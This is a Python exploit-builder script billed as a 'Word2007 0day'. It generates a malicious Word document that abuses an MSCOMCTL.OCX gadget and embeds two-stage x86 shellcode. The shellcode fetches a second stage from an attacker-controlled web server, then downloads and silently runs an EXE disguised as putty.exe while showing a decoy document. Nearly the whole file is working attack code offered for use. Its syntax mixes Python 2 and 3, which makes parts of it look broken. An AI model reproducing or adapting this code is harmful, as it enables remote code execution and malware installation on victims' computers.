#################################################################################
#
#    CONFIDENTIAL CODE - DISTRIBUTION OR REPRODUCTION IS STRICTLY FORBIDDEN
#
#################################################################################

# DO NOT MODIFY THIS FILE
# DO NOT SEND THIS FILE TO THE TARGET
# SEND ONLY THE GENERATED DOC FILE

___Shellcode = (
    b"\x00"
)

import sys
import zlib
import binascii
import sys, os, struct
import zipfile
import warnings

from resources import compressedfile


localbackdoor = None

DESCRIPTION = "Word2007 0day"
VERSION = "0.1"

#################################################################################
#
# EDIT THE FOLLOWING ONLY

# Full URL to your web server where you store your installer, etc
www = "http://192.168.69.233/"

# Filename of the EXE to download from your web server and execute on target
local_exe = "putty.exe"

# Filename of the document to download from your web server and display on target
local_doc = "document.doc"


#################################################################################
#
# OPTIONAL CONFIGURATION - DO NOT MODIFY

# location of stage2 = asm code
stage2_file = "stage3"

url_stage2 = www + stage2_file
url_doc = www + local_doc
url_exe = www + local_exe
timeout = 3
flags = "/q"



# This code executes the final EXE on the target and execute the provided 
# document file.
stage2 = (
    b"\x55\x8b\xec\x81\xec\xac\x01\x00\x00\xe8\xff\xff\xff\xff\xc8\x58"
    b"\x2d\x10\xfd\xff\xff\x89\x45\xf8\x8b\xf8\x2b\xc9\xf7\xd1\xb0\x00"
    b"\xf2\xae\xf7\xd1\x89\x7d\xf4\x2b\xc9\xf7\xd1\xb0\x00\xf2\xae\xf7"
    b"\xd1\x89\x7d\xf0\x2b\xc9\xf7\xd1\xb0\x00\xf2\xae\xf7\xd1\x89\x7d"
    b"\xec\x2b\xc9\xf7\xd1\xb0\x00\xf2\xae\xf7\xd1\x89\x7d\xe8\x2b\xc9"
    b"\xf7\xd1\xb0\x00\xf2\xae\xf7\xd1\x89\x7d\xe4\xe8\x33\x02\x00\x00"
    b"\x91\xb8\x8e\x4e\x0e\xec\xe8\x45\x02\x00\x00\x89\x45\xe0\xb8\x72"
    b"\xfe\xb3\x16\xe8\x38\x02\x00\x00\x89\x45\xd8\xb8\x7e\xd8\xe2\x73"
    b"\xe8\x2b\x02\x00\x00\x89\x45\xdc\xb8\x83\xb9\xb5\x78\xe8\x1e\x02"
    b"\x00\x00\x89\x45\xb4\xb8\x4f\x03\xc7\xbf\xe8\x11\x02\x00\x00\x89"
    b"\x45\xd0\xb8\x33\xca\x8a\x5b\xe8\x04\x02\x00\x00\x89\x45\xd4\xb8"
    b"\x6b\xd0\x2b\xca\xe8\xf7\x01\x00\x00\x89\x45\xc8\xb8\xfb\x97\xfd"
    b"\x0f\xe8\xea\x01\x00\x00\x89\x45\xc0\xb8\x70\x73\xef\x36\xe8\xdd"
    b"\x01\x00\x00\x89\x45\xc4\xb8\xad\xd9\x05\xce\xe8\xd0\x01\x00\x00"
    b"\x89\x45\xbc\xb8\xb0\x49\x2d\xdb\xe8\xc3\x01\x00\x00\x89\x45\xb8"
    b"\xff\x75\xf8\xff\x55\xe0\x91\xb8\x36\x1a\x2f\x70\xe8\xaf\x01\x00"
    b"\x00\x89\x45\xcc\x8d\x85\xb4\xfe\xff\xff\x50\x68\x00\x01\x00\x00"
    b"\xff\x55\xd4\x8d\x85\xb4\xfe\xff\xff\x50\xff\x55\xd0\xe8\xff\xff"
    b"\xff\xff\xc8\x58\x2d\xf3\xfe\xff\xff\x89\x85\xb0\xfe\xff\xff\x8d"
    b"\x50\x06\x8d\x72\x03\x8b\x7d\xcc\x89\x3e\x8d\x72\x0a\x8b\x7d\xd8"
    b"\x89\x3e\x8d\x72\x11\x8b\x7d\xec\x89\x3e\x8d\x72\x18\x8b\x7d\xf4"
    b"\x89\x3e\x8d\x85\xac\xfe\xff\xff\x50\x33\xc0\x50\x50\xff\xb5\xb0"
    b"\xfe\xff\xff\x50\x50\xff\x55\xc8\x89\x85\xac\xfe\xff\xff\x33\xff"
    b"\x57\x57\xff\x75\xf0\xff\x75\xe8\x57\xff\x55\xcc\xff\x55\xc4\x8d"
    b"\x78\x01\x89\xbd\xa8\xfe\xff\xff\x2b\xc9\xf7\xd1\xb8\x22\x00\x00"
    b"\x00\xf2\xae\xf7\xd1\x49\x8b\xb5\xa8\xfe\xff\xff\x8d\xbd\xb4\xfe"
    b"\xff\xff\xf3\xa4\xc6\x07\x20\x8d\x77\x01\x8b\x7d\xe4\x2b\xc9\xf7"
    b"\xd1\xb0\x00\xf2\xae\xf7\xd1\x49\x87\xf7\x8b\x75\xe4\xf3\xa4\xc6"
    b"\x07\x20\x8d\x77\x01\x8b\x7d\xf0\x2b\xc9\xf7\xd1\xb0\x00\xf2\xae"
    b"\xf7\xd1\x49\x87\xf7\x8b\x75\xf0\xf3\xa4\xc6\x07\x00\x33\xc0\x8d"
    b"\xbd\x54\xfe\xff\xff\x8b\xf7\xb9\x44\x00\x00\x00\xf3\xaa\xc7\x06"
    b"\x44\x00\x00\x00\x8d\xbd\x98\xfe\xff\xff\x57\x56\x33\xc0\x50\x50"
    b"\x50\x50\x50\x50\x8d\xb5\xb4\xfe\xff\xff\x56\x50\xff\x55\xd8\x6a"
    b"\xff\xff\xb5\xac\xfe\xff\xff\xff\x55\xbc\x68\x00\x00\x01\x00\xff"
    b"\x55\xb8\x33\xc0\x48\x50\xff\x55\xb4\x8b\xe5\x5d\xc2\x37\x00\x55"
    b"\x8b\xec\x83\xec\x64\xc7\x45\xfc\x00\x00\x00\x00\xc7\x45\xf8\x00"
    b"\x00\x00\x00\xc7\x45\xf4\x00\x00\x00\x00\xc7\x45\xf0\x00\x00\x00"
    b"\x00\x33\xff\x57\x57\xff\x75\xf0\xff\x75\xf4\x57\xff\x55\xfc\x33"
    b"\xc0\x8d\x7d\x9c\x8b\xf7\xb9\x44\x00\x00\x00\xf3\xaa\xc7\x06\x44"
    b"\x00\x00\x00\xc7\x46\x2c\x01\x00\x00\x00\x8d\x7d\xe0\x57\x56\x33"
    b"\xc0\x50\x50\x50\x50\x50\x50\x50\xff\x75\xf0\xff\x55\xf8\x8b\xe5"
    b"\x5d\xc3\xcc\x33\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
    b"\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\x8b\xc3\xc3"
    b"\x60\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a"
    b"\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b\x03\xf5\x33\xff"
    b"\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b"
    b"\x7c\x24\x1c\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a"
    b"\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61\xc3\x75\x72"
    b"\x6c\x6d\x6f\x6e"
    )

# This code will simply bootstrap stage2
stage1 = (
    b"\x55\x8b\xec\x83\xec\x2c\xe8\xff\xff\xff\xff\xc8\x58\x2d\xd5\xfe"
    b"\xff\xff\x89\x45\xfc\xe8\xff\xff\xff\xff\xc8\x58\x2d\xdc\xfe\xff"
    b"\xff\x89\x45\xf8\xe8\xa2\x00\x00\x00\x91\xb8\x8e\x4e\x0e\xec\xe8"
    b"\xb4\x00\x00\x00\x89\x45\xf4\xb8\x54\xca\xaf\x91\xe8\xa7\x00\x00"
    b"\x00\x89\x45\xf0\xff\x75\xfc\xff\x55\xf4\x91\xb8\x29\x44\xe8\x57"
    b"\xe8\x93\x00\x00\x00\x89\x45\xec\xb8\x49\xed\x0f\x7e\xe8\x86\x00"
    b"\x00\x00\x89\x45\xe8\xb8\x8b\x4b\xe3\x5f\xe8\x79\x00\x00\x00\x89"
    b"\x45\xe4\x33\xc0\x6a\x40\x68\x00\x30\x00\x00\x68\x00\x00\x01\x00"
    b"\x50\xff\x55\xf0\x89\x45\xd8\x33\xc0\x50\x50\x50\x50\x50\xff\x55"
    b"\xec\x89\x45\xe0\x33\xc0\x50\x50\x50\x50\xff\x75\xf8\xff\x75\xe0"
    b"\xff\x55\xe8\x89\x45\xdc\x8b\x7d\xd8\x8d\x45\xd4\x50\x68\x00\x01"
    b"\x00\x00\x57\xff\x75\xdc\xff\x55\xe4\x8b\x45\xd4\x85\xc0\x74\x04"
    b"\x03\xf8\xeb\xe5\xff\x65\xd8\x8b\xe5\x5d\xc3\x33\xc9\x64\x8b\x71"
    b"\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66"
    b"\x39\x4f\x18\x75\xf2\x8b\xc3\xc3\x60\x8b\x6c\x24\x18\x8b\x45\x3c"
    b"\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34"
    b"\x49\x8b\x34\x8b\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07"
    b"\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b\x7c\x24\x1c\x75\xe1\x8b\x5a\x24"
    b"\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5"
    b"\x89\x44\x24\x1c\x61\xc3\x77\x69\x6e\x69\x6e\x65\x74\x00"
)

Shellcode = ""

def verify(expl):

    df = open(expl, 'rb')
    _df = df.read()
    df.close()

    print("====================================================================")
    print("=      Microsoft Office Word Code Execution Exploit Generator      =")
    print("====================================================================")
    
    if _df.find(b"from setup import Shellcode") >= 0:
        print("[+] Injecting Shellcode into files ...")
    else:
        print("[-] Provided exploit file doesn't seem to import the Shellcode variable from setup.")
        print("    Please add 'from setup import Shellcode' within the file and erase all previous references to Shellcode.")
        sys.exit()

def makedocfile(zip):
	evilbuff = bytearray(zlib.decompress(compressedfile))

	offset = 0x3B50
	for i in range(0,8):
		evilbuff[offset + i] = binascii.hexlify(b"\x4A\xF4\x5E\x27")[i]              #push esp; retn 8 in MSCOMCTL.OCX
		evilbuff[offset -2*0x10 + i] = binascii.hexlify(b"\x08\x08\x00\x00")[i]      #size of copy
		evilbuff[offset -2*0x14 + i] = binascii.hexlify(b"\x08\x08\x00\x00")[i]      #        
	
	_Shellcode = binascii.hexlify(Shellcode)
	offset = offset + 8
	for i in range(0,128):
		evilbuff[offset + i] = b"90"[i%2]

	offset = offset + 2 + 128
	for i in range(0,252):
		evilbuff[offset + i] = b"90"[i%2]
	
	offset = offset + 2 + 252 
	for i in range(0,252):
		evilbuff[offset + i] = b"90"[i%2]	
		
	for i in range(0,4):
		evilbuff[offset + 252 -2*0x26 + i] = b"EB04"[i]	                             #jump to shellcode
		
	offset = offset + 2 + 252
	k = 0
	for i in range(0,len(_Shellcode)):
		if (i%252==0 and i>0):
			k = k + 2
		evilbuff[offset + i + k] = _Shellcode[i]

	with warnings.catch_warnings():
		warnings.simplefilter('ignore')
		file_tmp = os.tempnam()

	f = open(file_tmp,mode='wb')
	f.write(evilbuff)
	f.close()
	
	
	zip.write(file_tmp, "target.doc")
	
	try:
		os.unlink(file_tmp)
	except WindowsError:
		print "I/O error when deleting temp. files"

def makestagefile(zip):

	with warnings.catch_warnings():
		warnings.simplefilter('ignore')
		file_tmp = os.tempnam()
		
	df = open(file_tmp,mode='wb')
    
	# Patch dynamically this value 0x00010000 with timeout (in milliseconds)
	# Sleep: FF 55 BC 68 \/00 00 01 00\/ FF 55 B8

	payload = stage2[:33*0x10+11] + struct.pack("<I", timeout * 1000) + stage2[33*0x10+15:]
	df.write(b"\x00".join( [ payload, local_exe.encode(), local_doc.encode(), url_exe.encode(), url_doc.encode(), flags.encode() ] ) + b"\x00" )
	df.close()
	
	zip.write(file_tmp, stage2_file)
	
	try:
		os.unlink(file_tmp)
	except WindowsError:
		print "I/O error when deleting temp. files"
	
	print "done stage"
	
def makefile(url, output):
	global www
	global local_exe
	global local_doc
	global stage2_file
	global url_stage2
	global url_doc
	global url_exe
	global Shellcode
	
	endslash = url.rfind('/')
	www = url[0:endslash+1]		# base dir
	local_exe = url[endslash+1:] # Filename of the EXE to download from your web server and execute on target
	local_doc = "document.doc"
	stage2_file = "stage3"
	url_stage2 = www + stage2_file
	url_doc = www + local_doc
	url_exe = www + local_exe
	
	print "www %s" %(www)
	timeout = 3
	flags = "/q"

	url_stage2 = www + stage2_file
	url_doc = www + local_doc   
	url_exe = www + local_exe
	Shellcode = b"".join([b"\x90\x90", stage1, url_stage2.encode() ]) + b"\x00"
	
	# Create the output archive
	print "Creating %s zip file archive"%(output)
	zip = zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED)
	
	makedocfile(zip)
	makestagefile(zip)

	zip.close()


if __name__=='__main__':
	print ("[+] Microsoft Office Word 2007/2003/2002 Code Execution Exploit")
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http]} [urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(1)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
		else:
			print "[ERROR] Unsupported payload method {http}"
			sys.exit(1)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	makefile(sys.argv[2], sys.argv[3])
		
	print ' ... done'
